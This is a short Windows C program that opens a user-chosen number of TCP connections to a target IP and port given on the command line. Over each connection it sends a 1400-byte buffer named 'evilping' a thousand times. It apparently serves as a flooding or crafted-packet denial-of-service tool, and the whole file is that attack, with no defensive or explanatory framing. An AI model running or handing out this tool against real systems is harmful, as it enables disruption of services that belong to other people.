
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib") //Winsock Library

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

int main(int argc, char *argv[])
{
    int numberOfSessions = atoi(argv[3]);
    for (int i = 0; i < numberOfSessions; i++)
    {
        WSADATA wsa;
        SOCKET s;
        struct sockaddr_in server;

        //printf("\nInitialising Winsock...");
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        {
            printf("Failed. Error Code : %d", WSAGetLastError());
            return 1;
        }

        if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        {
            printf("Could not create socket : %d", WSAGetLastError());
        }

        //printf("Socket created.\n");
        int port = atoi(argv[2]);
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        server.sin_addr.s_addr = inet_addr(argv[1]);

        //Connect to remote server
        if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
        {
            puts("connect error");
            return 1;
        }

        char evilping[1400];
        for (int i = 0; i < 700; i += 2)
        {
            evilping[i] = 1;
            evilping[i + 1] = 0;
        }

        for (int i = 0; i < 1000; i++)
        {
            send(s, evilping, sizeof(evilping), 0);
        }
    }
    printf("done");
    return 0;
}
